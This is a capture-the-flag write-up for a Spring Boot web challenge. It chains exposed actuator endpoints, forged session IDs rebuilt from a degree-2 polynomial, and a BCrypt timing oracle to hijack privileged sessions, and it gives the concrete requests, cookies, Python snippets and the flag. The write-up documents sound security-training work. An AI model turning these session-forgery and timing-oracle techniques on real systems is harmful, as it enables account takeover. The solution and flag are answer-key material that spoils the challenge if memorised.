# Bricktator v1 — Writeup

## Challenge
Web challenge. Spring Boot application — same "NCC Control Center" as v2, but with all Spring Actuator endpoints exposed (`management.endpoints.web.exposure.include=*`) and a new `/actuator/accesslog` endpoint. Target: `http://bricktator.web.ctf.umasscybersec.org:8080/`. Source provided in `/home/foqs/ctf/`.

## Recon

**Source audit differences from v2:**

- `application.properties`: `management.endpoints.web.exposure.include=*` — all actuator endpoints public to authenticated users
- New class `AccessLogEndpoint.java`: exposes `/actuator/accesslog` returning BCrypt hashes of every YANKEE_WHITE session that hits `/command`
- `AccessLog.java`: `record(String sessionHash)` stores `BCrypt(rawSessionId + PEPPER)` on each YANKEE_WHITE `/command` access
- `CommandWorkFilter.java`: BCrypt strength 13 (~1.34s) applied before response for YANKEE_WHITE sessions; Q_CLEARANCE sessions skip it (~0.22s)
- `SessionSeeder.java`: 5000 sessions, degree-2 Shamir polynomial, 7 random YANKEE_WHITE among x=2..5000 (excluding x=5)
- `SecretSharing.java`: `PRIME = 2_147_483_647L` (2³¹−1), `evaluate(x)` intact; session IDs formatted as `%05d-%08x` (x, f(x) mod PRIME)
- `SecurityConfig.java`: `bricktator` password hardcoded as `goldeagle`

**Anchor sessions from `/actuator/sessions`:**
- `john_doe` (x=1): `00001-39bae854`
- `jane_doe` (x=5): `00005-0225df7d`
- `bricktator` (x=5001): `05001-6537216c`

## Vulnerability

Two primitives chain together:

1. **Polynomial reconstruction via actuator**: `/actuator/sessions?username=<user>` is accessible to authenticated Q_CLEARANCE/YANKEE_WHITE sessions. With 3 anchor shares the degree-2 polynomial is fully determined. All 4998 seeded session IDs can be computed.

2. **BCrypt timing oracle on `/command`**: `CommandWorkFilter` runs `BCrypt.checkpw(rawId + PEPPER, storedHash)` (strength 13, ~1.34s) for every YANKEE_WHITE session on `/command` before returning a response. Q_CLEARANCE sessions skip this entirely (~0.22s). Sending candidate session cookies and measuring response time distinguishes YANKEE_WHITE from Q_CLEARANCE with a clear 6× signal gap.

The override mechanism requires bricktator (1) + 4 other YANKEE_WHITE sessions to POST to `/override/{token}` within a 10-minute window.

## Exploitation

**1. Login as bricktator:**
```
POST /login  username=bricktator&password=goldeagle
→ SESSION=MDUwMDEtNjUzNzIxNmM=  (05001-6537216c)
```

**2. Reconstruct polynomial (Gaussian elimination mod 2³¹−1):**
```
Points: (1, 0x39bae854), (5, 0x0225df7d), (5001, 0x6537216c)
a=2027519359, b=1023528138, c=64986634
f(x) = a·x² + b·x + c  mod 2147483647
```

**3. Generate all 4998 candidate session IDs:**
```python
for x in range(2, 5001):
    if x == 5: continue
    y = (a*x*x + b*x + c) % PRIME
    sid = f"{x:05d}-{y:08x}"
```

**4. BCrypt timing oracle — 15 concurrent async workers scanning all candidates:**
```python
# GET /command with Cookie: SESSION=<base64(sid)>
# elapsed >= 0.8s → YANKEE_WHITE
```
Full 4998-candidate scan completed in ~73 seconds. 7 YANKEE_WHITE sessions identified:
```
00496-2779b0a7
01257-25e028f1
01965-04577b22
02375-2842ff1f
02539-77776cf9
03960-43d57c28
04859-508dc6a3
```

**5. Initiate override as bricktator:**
```
POST /command/override   Cookie: SESSION=MDUwMDEtNjUzNzIxNmM=
→ /override/2537432ef0980c98ba3173bd06c30611  (1 of 5 approved)
```

**6. Submit 4 YANKEE_WHITE approvals:**
```
POST /override/2537432ef0980c98ba3173bd06c30611   Cookie: SESSION=MDA0OTYtMjc3OWIwYTc=
POST /override/2537432ef0980c98ba3173bd06c30611   Cookie: SESSION=MDEyNTctMjVlMDI4ZjE=
POST /override/2537432ef0980c98ba3173bd06c30611   Cookie: SESSION=MDE5NjUtMDQ1NzdiMjI=
POST /override/2537432ef0980c98ba3173bd06c30611   Cookie: SESSION=MDIzNzUtMjg0MmZmMWY=
→ PROTOCOL SIGMA INITIATED
```

## Flag
`UMASS{stUx_n3T_a1nt_g0T_n0th1nG_0N_th15}`

## Timeline
- Session summary: multiple agent runs; heap dump approach attempted (99MB HPROF parsed successfully as validation), final solve via concurrent BCrypt timing oracle in 73s.

---
Solved with foqsec, by lilsadfoqs.
